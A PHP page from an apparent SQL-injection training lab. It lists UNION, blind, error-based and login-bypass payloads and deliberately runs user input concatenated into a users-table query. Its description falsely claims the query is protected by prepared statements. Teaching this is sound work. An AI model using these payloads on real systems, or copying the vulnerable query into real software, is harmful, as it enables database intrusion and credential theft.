<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../db.php';
require_once __DIR__ . '/../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'SQL Injection';
$description = '<p><strong>SQL Injection</strong>은 애플리케이션의 데이터베이스 쿼리에 악의적인 SQL 코드를 삽입하는 공격입니다.</p>
<p>이 페이지에서는 다양한 SQL Injection 기법을 안전한 환경에서 테스트할 수 있습니다.</p>
<p><strong>참고:</strong> 실제 쿼리는 준비된 문(Prepared Statement)으로 보호되어 있어 안전합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'union' => [
        'title' => '🔗 UNION-based SQL Injection',
        'description' => 'UNION 연산자를 사용하여 다른 테이블의 데이터를 조회하는 기법입니다.',
        'payloads' => [
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT null,null,null--",
            "1' UNION SELECT database(),user(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    ],
    'boolean' => [
        'title' => '✅ Boolean-based SQL Injection',
        'description' => '조건문의 참/거짓 결과를 이용하여 데이터를 추출하는 기법입니다.',
        'payloads' => [
            "1' AND '1'='1",
            "1' AND '1'='2", 
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64--",
            "1' OR 1=1--"
        ]
    ],
    'time' => [
        'title' => '⏱️ Time-based SQL Injection',
        'description' => '시간 지연을 이용하여 정보를 추출하는 블라인드 SQL Injection 기법입니다.',
        'payloads' => [
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT SLEEP(5))--",
            "1'; SELECT pg_sleep(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--"
        ]
    ],
    'error' => [
        'title' => '❌ Error-based SQL Injection',
        'description' => '의도적으로 오류를 발생시켜 데이터베이스 정보를 노출시키는 기법입니다.',
        'payloads' => [
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "1' AND EXP(~(SELECT * FROM (SELECT version())a))--"
        ]
    ],
    'basic' => [
        'title' => '🔧 Basic SQL Injection',
        'description' => '기본적인 SQL Injection 페이로드들입니다.',
        'payloads' => [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1"
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>준비된 문(Prepared Statements) 사용:</strong> 가장 효과적인 방어 방법",
    "<strong>입력 값 검증:</strong> 사용자 입력을 철저히 검증",
    "<strong>저장 프로시저 사용:</strong> 동적 SQL 구문 대신 저장 프로시저 활용",
    "<strong>최소 권한 원칙:</strong> 데이터베이스 사용자에게 필요한 최소한의 권한만 부여",
    "<strong>에러 메시지 숨김:</strong> 데이터베이스 오류 정보를 사용자에게 노출하지 않음",
    "<strong>웹 애플리케이션 방화벽(WAF) 사용:</strong> SQL Injection 패턴 탐지 및 차단"
];

// 4. 참고 자료 정의
$references = [
    "PayloadsAllTheThings - SQL Injection" => "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
    "OWASP - SQL Injection" => "https://owasp.org/www-community/attacks/SQL_Injection",
    "PortSwigger - SQL Injection" => "https://portswigger.net/web-security/sql-injection"
];

// 5. 테스트 폼 UI 정의
$payload = htmlspecialchars($_POST['payload'] ?? '');
$test_form_ui = <<<HTML
<form method="post" class="test-form">
    <h3>🧪 페이로드 테스트</h3>
    <label for="payload">SQL Injection 페이로드:</label>
    <textarea name="payload" id="payload" placeholder="여기에 테스트할 페이로드를 입력하거나 위의 버튼을 클릭하세요">{$payload}</textarea>
    <br><br>
    <button type="submit" class="btn" style="background: #dc3545;">테스트 실행</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    global $pdo;
    
    // PDO 연결 확인
    if (!isset($pdo) || $pdo === null) {
        return [
            'result' => '',
            'error' => '데이터베이스 연결이 설정되지 않았습니다. 데이터베이스 설정을 확인하세요.'
        ];
    }
    
    $payload = $form_data['payload'] ?? '';
    $result = '';
    $error = '';

    try {
        // 취약한 쿼리 실제 실행 (교육용)
        $vulnerable_query = "SELECT id, username FROM users WHERE id = '" . $payload . "'";
        $result .= "<div class='info-box' style='background: #fff3cd; border-color: #ffeeba; color: #856404;'>";
        $result .= "<strong>⚠️ 취약한 쿼리 실행:</strong><br>";
        $result .= "<code>" . htmlspecialchars($vulnerable_query) . "</code></div><br>";
        
        // 실제 취약한 쿼리 실행
        $stmt = $pdo->query($vulnerable_query);
        
        if ($stmt) {
            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            if ($results) {
                $result .= "<div class='success-box' style='background: #d4edda; border-color: #c3e6cb; color: #155724; padding: 10px; margin: 10px 0; border: 1px solid; border-radius: 4px;'>";
                $result .= "<strong>✅ 쿼리 실행 성공!</strong><br>";
                $result .= "발견된 레코드 수: " . count($results) . "<br><br>";
                
                foreach ($results as $index => $row) {
                    $result .= "<strong>레코드 " . ($index + 1) . ":</strong><br>";
                    foreach ($row as $column => $value) {
                        $result .= "- " . htmlspecialchars($column) . ": " . htmlspecialchars($value ?? '') . "<br>";
                    }
                    $result .= "<br>";
                }
                $result .= "</div>";
            } else {
                $result .= "<div class='warning-box' style='background: #fff3cd; border-color: #ffeeba; color: #856404; padding: 10px; margin: 10px 0; border: 1px solid; border-radius: 4px;'>";
                $result .= "쿼리는 실행되었지만 결과가 없습니다.";
                $result .= "</div>";
            }
        } else {
            $result .= "<div class='error-box' style='background: #f8d7da; border-color: #f5c6cb; color: #721c24; padding: 10px; margin: 10px 0; border: 1px solid; border-radius: 4px;'>";
            $result .= "쿼리 실행에 실패했습니다.";
            $result .= "</div>";
        }
        
        // 보안 권장사항 표시
        $result .= "<div class='info-box' style='background: #d1ecf1; border-color: #bee5eb; color: #0c5460; padding: 10px; margin: 10px 0; border: 1px solid; border-radius: 4px;'>";
        $result .= "<strong>🛡️ 보안 권장사항:</strong><br>";
        $result .= "실제 환경에서는 준비된 문(Prepared Statement)을 사용하여 이러한 공격을 방지해야 합니다.";
        $result .= "</div>";
        
    } catch (Exception $e) {
        $error = "<div class='error-box' style='background: #f8d7da; border-color: #f5c6cb; color: #721c24; padding: 10px; margin: 10px 0; border: 1px solid; border-radius: 4px;'>";
        $error .= "쿼리 실행 중 오류 발생: " . htmlspecialchars($e->getMessage());
        $error .= "</div>";
    }

    return ['result' => $result, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references, 'SQL_Injection_Analysis.md');
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();